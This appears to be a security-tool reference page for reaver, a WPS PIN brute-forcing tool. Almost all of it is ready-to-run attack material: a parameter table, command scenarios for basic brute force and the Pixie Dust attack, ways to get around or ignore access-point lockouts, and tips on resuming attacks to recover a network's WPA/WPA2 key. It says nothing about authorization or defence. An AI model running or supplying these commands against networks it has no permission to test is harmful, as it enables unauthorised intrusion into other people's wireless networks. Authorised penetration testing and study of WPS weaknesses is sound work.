# reaver

- **Category**: Wireless / WPS Cracking
- **Risk Level**: 🔴 High

---

## Description

Reaver brute-forces the WPS (Wi-Fi Protected Setup) PIN to recover the WPA/WPA2 key. The WPS PIN is an 8-digit number that, due to a design flaw, can be verified in two independent halves: a 4-digit first half and a 3-digit second half (the 8th digit is a checksum). This means only ~11,000 attempts are needed in theory (10,000 for the first half + 1,000 for the second half, rather than 10^8). On success, the plaintext WPA/WPA2 key is returned directly, with no dictionary required.

## Installation

```bash
sudo apt install reaver
```

## Parameter Reference

| Parameter | Description |
|------|------|
| `-i <iface>` | Name of the monitor-mode interface to use |
| `-b <bssid>` | BSSID of the target AP |
| `-c <channel>` | Set the 802.11 channel for the interface (implies -f) |
| `-e <ssid>` | ESSID of the target AP |
| `-p <pin>` | Use the specified pin (may be arbitrary string or 4/8 digit WPS pin) |
| `-K` / `-Z` | Run pixiedust attack |
| `-d <delay>` | Delay in seconds between attempts (default: 1) |
| `-r <x:y>` | Recurring delay: sleep y seconds every x PIN attempts (e.g., `-r 3:15`) |
| `-l <lockout>` | Set the time to wait if the AP locks WPS pin attempts (default: 60) |
| `-O <output>` | Write packets of interest to pcap file |
| `-t <timeout>` | Set the receive timeout period (default: 10) |
| `-x <seconds>` | Sleep time after 10 consecutive unexpected failures (`--fail-wait`, default: 0) |
| `-N` | Do not send NACK messages |
| `-S` | Use small DH keys to improve crack speed |
| `-L` | Ignore locked state reported by the target AP |
| `-E` | Terminate each WPS session with an EAP FAIL packet (`--eap-terminate`) |
| `-w` | Mimic a Windows 7 registrar (`--win7`) |
| `-vv` | Very verbose output |
| `-v` | Display non-critical warnings (-vv or -vvv for more) |
| `-q` | Only display critical messages |
| `--no-nacks` | Do not send NACK messages when out of order packets are received |
| `--dh-small` | Use small DH keys |
| `-m <mac>` | MAC address of the host system |

## Common Commands

### Scenario 1: Basic WPS Brute-Force

```bash
# First use wash to identify APs with WPS enabled
sudo wash -i wlan0mon

# Basic attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Specify channel for speed (no channel hopping needed)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv
```

### Scenario 2: Pixie Dust Attack (Fast — Seconds to Minutes)

```bash
# Pixie Dust attack (exploits weak random number generator vulnerability)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K -vv

# Combined with channel lock
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K -vv
```

### Scenario 3: Handle Lockouts and Timeouts

```bash
# Increase delay to avoid AP lockout
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 5 -vv

# Wait longer after lockout
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -l 300 -vv

# Ignore lockout and keep trying (works on some APs)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -L -vv

# Use small DH keys for speed (required by some APs)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -S -vv
```

### Scenario 4: Resume from Checkpoint

```bash
# Start from a specific PIN (check previous progress)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 12340000 -vv

# Reaver automatically saves progress to /etc/reaver/<bssid>.wpc (older versions)
# Newer fork (t6x) saves to /usr/local/etc/reaver/<bssid>.wpc or working directory
# Simply re-run to continue from the last checkpoint
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

## Notes & Tips

1. A full WPS brute-force can take 4–10 hours (approximately 1–2 seconds per attempt)
2. Many modern routers have WPS lockout enabled (typically locks after 10 failed attempts for 60 seconds)
3. The Pixie Dust attack only works against specific vendor APs (Broadcom, Ralink, etc.) and can yield results in seconds
4. Use `wash` or `airodump-ng --wps` first to confirm the target supports WPS and is not locked
5. Progress is saved in `/etc/reaver/<bssid>.wpc` (or current working directory for newer fork builds); delete this file to restart from scratch
6. bully is an alternative to reaver and may have a higher success rate in some cases
7. **Prerequisite**: interface must be in monitor mode (`airmon-ng start wlan0`) before running reaver

---

## Official References

- [reaver-wps-fork-t6x (GitHub, Kali version)](https://github.com/t6x/reaver-wps-fork-t6x)
- [Kali reaver](https://www.kali.org/tools/reaver/)
